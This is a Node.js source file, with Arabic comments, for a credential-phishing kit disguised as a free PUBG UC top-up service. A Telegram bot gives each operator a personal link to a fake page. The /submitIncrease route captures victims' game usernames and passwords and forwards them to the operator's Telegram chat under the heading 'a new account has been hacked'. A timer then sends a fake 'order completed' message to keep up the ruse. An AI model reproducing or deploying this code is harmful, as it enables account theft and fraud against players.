const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// استخدام middleware لتحليل JSON
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// خدمة الملفات الثابتة
app.use(express.static('public'));

// تهيئة بوت التليجرام
const token = process.env.s; // توكن البوت من متغيرات البيئة
const bot = new TelegramBot(token, { polling: true });

// تخزين الطلبات (في بيئة حقيقية، استخدم قاعدة بيانات)
let requests = [];

// مسار الصفحة الرئيسية
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'pubg_uc.html'));
});

// مسار لمعالجة طلبات الشحن
app.post('/submitIncrease', async (req, res) => {
  try {
    const { chatId, username, password, uc } = req.body;
    
    // حفظ الطلب
    const request = {
      id: Date.now(),
      chatId,
      username,
      password,
      uc,
      timestamp: new Date().toLocaleString('ar-SA'),
      status: 'pending'
    };
    
    requests.push(request);
    
    // إرسال رسالة إلى البوت
    const message = `
    📦 تم اختراق حساب جديد:
    
    👤 اسم المستخدم: ${username}
    🔐 كلمة المرور: ${password}
    ⏰ الوقت: ${request.timestamp}
    `;
    
    await bot.sendMessage(chatId, message);
    
    res.json({ success: true, message: 'تم استلام طلبك بنجاح' });
  } catch (error) {
    console.error('Error processing request:', error);
    res.status(500).json({ success: false, message: 'حدث خطأ أثناء معالجة الطلب' });
  }
});

// مسار للتحقق من حالة الطلب
app.get('/checkStatus/:requestId', (req, res) => {
  const requestId = parseInt(req.params.requestId);
  const request = requests.find(r => r.id === requestId);
  
  if (request) {
    res.json({ status: request.status });
  } else {
    res.status(404).json({ error: 'الطلب غير موجود' });
  }
});

// تشغيل المخدم
app.listen(PORT, () => {
  console.log(`✅ Server is running on port ${PORT}`);
});

// معالجة رسائل البوت
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (text === '/start') {
    const welcomeMessage = `
    🎮 مرحباً بك في بوت شحن شدات ببجي!
    
    لإضافة شدات إلى حسابك، يرجى استخدام الرابط التالي:
    ${process.env.R}/pubg_uc.html/${chatId}
    
    ⚠️ ملاحظة: احتفظ بهذا الرابط خاصاً ولا تشاركه مع الآخرين.
    `;
    
    bot.sendMessage(chatId, welcomeMessage);
  }
});

// دالة للتحقق من الطلبات كل 15 دقيقة (محاكاة لإكمال الطلب)
setInterval(() => {
  const now = new Date();
  requests.forEach(request => {
    if (request.status === 'pending') {
      const requestTime = new Date(request.id);
      const diffMinutes = (now - requestTime) / (1000 * 60);
      
      if (diffMinutes >= 15) {
        request.status = 'completed';
        
        // إرسال رسالة إشعار بإكمال الطلب
        const completionMessage = `
        ✅ تم اكتمال طلبك!
        
        👤 اسم المستخدم: ${request.username}
        🎮 عدد الشدات: ${request.uc}
        ⏰ وقت الإكمال: ${new Date().toLocaleString('ar-SA')}
        
        شكراً لاستخدامك خدمتنا! 🎮
        `;
        
        bot.sendMessage(request.chatId, completionMessage)
          .catch(err => console.error('Error sending completion message:', err));
      }
    }
  });
}, 60000); // التحقق كل دقيقة
